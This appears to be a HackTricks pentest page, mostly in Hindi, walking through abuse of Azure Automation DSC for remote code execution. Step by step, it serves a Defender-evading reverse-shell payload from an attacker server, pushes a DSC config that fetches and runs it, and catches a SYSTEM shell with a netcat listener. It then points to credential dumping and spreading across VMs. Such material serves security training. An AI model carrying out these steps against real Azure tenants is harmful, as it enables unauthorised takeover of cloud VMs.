# Az - State Configuration RCE

{{#include ../../../../banners/hacktricks-training.md}}

**Check the complete post in:** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)

### Summary of Remote Server (C2) Infrastructure Preparation and Steps

#### Overview

यह प्रक्रिया एक संशोधित Nishang `Invoke-PowerShellTcp.ps1` पेलोड को होस्ट करने के लिए एक रिमोट सर्वर इन्फ्रास्ट्रक्चर सेटअप करने में शामिल है, जिसे `RevPS.ps1` कहा जाता है, जिसे Windows Defender को बायपास करने के लिए डिज़ाइन किया गया है। पेलोड को एक Kali Linux मशीन से IP `40.84.7.74` के साथ एक साधारण Python HTTP सर्वर का उपयोग करके परोसा जाता है। यह ऑपरेशन कई चरणों के माध्यम से निष्पादित किया जाता है:

#### Step 1 — Create Files

- **Files Required:** दो PowerShell स्क्रिप्ट की आवश्यकता है:
1. `reverse_shell_config.ps1`: एक Desired State Configuration (DSC) फ़ाइल जो पेलोड को लाने और निष्पादित करने के लिए है। इसे [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse_shell_config.ps1) से प्राप्त किया जा सकता है।
2. `push_reverse_shell_config.ps1`: VM पर कॉन्फ़िगरेशन को प्रकाशित करने के लिए एक स्क्रिप्ट, जो [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push_reverse_shell_config.ps1) पर उपलब्ध है।
- **Customization:** इन फ़ाइलों में वेरिएबल और पैरामीटर को उपयोगकर्ता के विशिष्ट वातावरण के अनुसार अनुकूलित किया जाना चाहिए, जिसमें संसाधन नाम, फ़ाइल पथ, और सर्वर/पेलोड पहचानकर्ता शामिल हैं।

#### Step 2 — Zip Configuration File

- `reverse_shell_config.ps1` को एक `.zip` फ़ाइल में संकुचित किया जाता है, जिससे इसे Azure Storage Account में स्थानांतरित करने के लिए तैयार किया जा सके।
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
#### Step 3 — स्टोरेज संदर्भ सेट करें और अपलोड करें

- ज़िप किया गया कॉन्फ़िगरेशन फ़ाइल एक पूर्वनिर्धारित Azure स्टोरेज कंटेनर, azure-pentest, में Azure के Set-AzStorageBlobContent cmdlet का उपयोग करके अपलोड किया जाता है।
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
#### Step 4 — Prep Kali Box

- Kali सर्वर GitHub रिपॉजिटरी से RevPS.ps1 पेलोड डाउनलोड करता है।
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
- स्क्रिप्ट को लक्षित Windows VM और रिवर्स शेल के लिए पोर्ट निर्दिष्ट करने के लिए संपादित किया गया है।

#### Step 5 — Publish Configuration File

- कॉन्फ़िगरेशन फ़ाइल को निष्पादित किया जाता है, जिसके परिणामस्वरूप रिवर्स-शेल स्क्रिप्ट को Windows VM पर निर्दिष्ट स्थान पर तैनात किया जाता है।

#### Step 6 — Host Payload and Setup Listener

- पायथन SimpleHTTPServer को पेलोड को होस्ट करने के लिए शुरू किया जाता है, साथ ही एक Netcat लिस्नर को आने वाले कनेक्शनों को कैप्चर करने के लिए।
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
- निर्धारित कार्य पेलोड को निष्पादित करता है, SYSTEM-स्तरीय विशेषाधिकार प्राप्त करता है।

#### निष्कर्ष

इस प्रक्रिया का सफल निष्पादन आगे की क्रियाओं के लिए कई संभावनाएँ खोलता है, जैसे कि क्रेडेंशियल डंपिंग या हमले को कई VMs तक बढ़ाना। गाइड Azure Automation DSC के क्षेत्र में निरंतर सीखने और रचनात्मकता को प्रोत्साहित करता है।

{{#include ../../../../banners/hacktricks-training.md}}
